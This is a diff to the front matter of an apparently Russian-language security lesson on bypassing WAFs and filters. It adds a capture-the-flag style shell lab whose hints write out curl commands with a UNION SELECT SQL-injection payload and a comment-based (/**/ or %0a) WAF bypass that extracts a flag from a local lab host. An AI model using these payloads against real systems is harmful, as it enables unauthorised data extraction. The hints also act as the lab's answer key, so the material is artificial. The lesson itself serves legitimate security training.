@@ -12,6 +12,18 @@ useful_for:
   - "Bug bounty"
 estimated_minutes: 45
 summary: "Когда payload не проходит: кодирование, нормализация, расхождения парсеров и техники обхода WAF/фильтров."
+lab:
+  kind: shell
+  title: "Практика: обход WAF"
+  toolset: [core, curl]
+  workdir: /home/student/task
+  files: [task.md]
+  check: "grep -q 'nto{' found.txt"
+  hints:
+    - Базовый запрос: `curl -s 'http://shop.local/search?q=laptop'`.
+    - Классический payload блокируется WAF: `curl -s -i 'http://shop.local/search?q=1+UNION+SELECT+flag+FROM+secrets'` → 403.
+    - WAF ищет пробел между UNION и SELECT. Замени пробел комментарием `/**/` (или `%0a`).
+    - Достань флаг: `curl -s 'http://shop.local/search?q=1+UNION/**/+SELECT+flag+FROM+secrets' | tail -1 > found.txt`, затем `check`.
 ---
 
 ## Вопрос, с которого всё начинается
